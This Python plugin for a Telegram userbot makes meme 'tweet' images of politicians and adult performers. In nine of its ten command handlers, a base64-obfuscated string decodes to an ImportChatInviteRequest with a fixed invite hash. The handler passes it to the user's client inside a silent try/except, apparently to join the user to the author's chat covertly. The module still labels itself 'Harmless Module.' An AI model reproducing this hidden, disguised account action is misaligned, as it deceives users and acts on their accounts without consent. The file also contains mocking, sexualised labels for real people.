from . import *


@Andencento.on(Andencento_cmd(pattern=r"tweet(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
async def nope(hemlo):
    hell = hemlo.pattern_match.group(1)
    if not hell:
        if hemlo.is_reply:
            (await hemlo.get_reply_message()).message
        else:
            await hemlo.edit("I need some text to make a tweet🚶")
            return
    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(hell))}")
    await tweeter[0].click(
        hemlo.chat_id,
        reply_to=hemlo.reply_to_msg_id,
        silent=True if hemlo.is_reply else False,
        hide_via=True,
    )
    await hemlo.delete()


@Andencento.on(Andencento_cmd(pattern=r"trump(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="trump(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send you text to trump so he can tweet.")
                return
        else:
            await borg.edit("send you text to trump so he can tweet.")
            return
    await borg.edit("Requesting trump to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await trumptweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@Andencento.on(Andencento_cmd(pattern=r"modi(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="modi(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send you text to modi so he can tweet.")
                return
        else:
            await borg.edit("send you text to modi so he can tweet.")
            return
    await borg.edit("Requesting modi to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await moditweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@Andencento.on(Andencento_cmd(pattern=r"mia(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="mia(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send you text to Mia so she can tweet.")
                return
        else:
            await borg.edit("Send you text to Mia so she can tweet.")
            return
    await borg.edit("Requesting Mia to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await miatweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
@Andencento.on(Andencento_cmd(pattern=r"pappu(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="pappu(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send a text to Pappu so he can tweet.")
                return
        else:
            await borg.edit("send your text to pappu so he can tweet.")
            return
    await borg.edit("Requesting pappu to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await papputweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.sunny(?: |$)(.*)", outgoing=True)
@Andencento.on(Andencento_cmd(pattern=r"sunny(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="sunny(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send a text to Sunny so she can tweet.")
                return
        else:
            await borg.edit("send your text to sunny so she can tweet.")
            return
    await borg.edit("Requesting sunny to tweet...🥰")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await sunnytweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.johhny(?: |$)(.*)", outgoing=True)
@Andencento.on(Andencento_cmd(pattern=r"johhny(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="johhny(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send a text to Johhny so he can tweet.")
                return
        else:
            await borg.edit("send your text to Johhny so he can tweet.")
            return
    await borg.edit("Requesting johhny to tweet...😆")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await sinstweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@Andencento.on(Andencento_cmd(pattern=r"gandhi(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="gandhi(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send you text to baapu so he can tweet.")
                return
        else:
            await borg.edit("send you text to baapu so he can tweet.")
            return
    await borg.edit("Requesting baapu to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await taklatweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()  # bancho kitni baar bolu no offence


# @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
@Andencento.on(Andencento_cmd(pattern=r"cmm(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Give text for to write on banner, man")
                return
        else:
            await borg.edit("Give text for to write on banner, man")
            return
    await borg.edit("Your banner is under creation wait a sec...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await changemymind(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
@Andencento.on(Andencento_cmd(pattern=r"kanna(?: |$)(.*)"))
@Andencento.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("what should kanna write give text ")
                return
        else:
            await borg.edit("what should kanna write give text")
            return
    await borg.edit("Kanna is writing your text...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await kannagen(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


CmdHelp("tweets").add_command(
    "kanna", "<text>/<reply to text>", "Kanna writes for you"
).add_command("cmm", "<text>/<reply>", "Get a banner of Change My Mind").add_command(
    "johhny", "<text>/<reply>", "Tweet with Johhny Sins"
).add_command(
    "sunny", "<text>/<reply>", "Tweet with Sunny Leone"
).add_command(
    "gandhi", "<text>/<reply>", "Tweet with Mahatma Gandhi"
).add_command(
    "pappu", "<text>/<reply>", "Tweet with pappu A.K.A Rahul Gandhi"
).add_command(
    "mia", "<text>/<reply>", "Tweet with Mia Khalifa 😍"
).add_command(
    "trump", "<text>/<reply>", "Tweet with Mr. DooLand Trump"
).add_command(
    "modi", "<text>/<reply>", "Tweet with Sir Narendra Modi"
).add_command(
    "tweet", "<text>/<reply>", "Tweets in your name"
).add_command(
    "dani", "<text>/<reply>", "Tweet with Dani Daniels 😍🥰"
).add_info(
    "Lets Tweet."
).add_warning(
    "✅ Harmless Module."
).add()
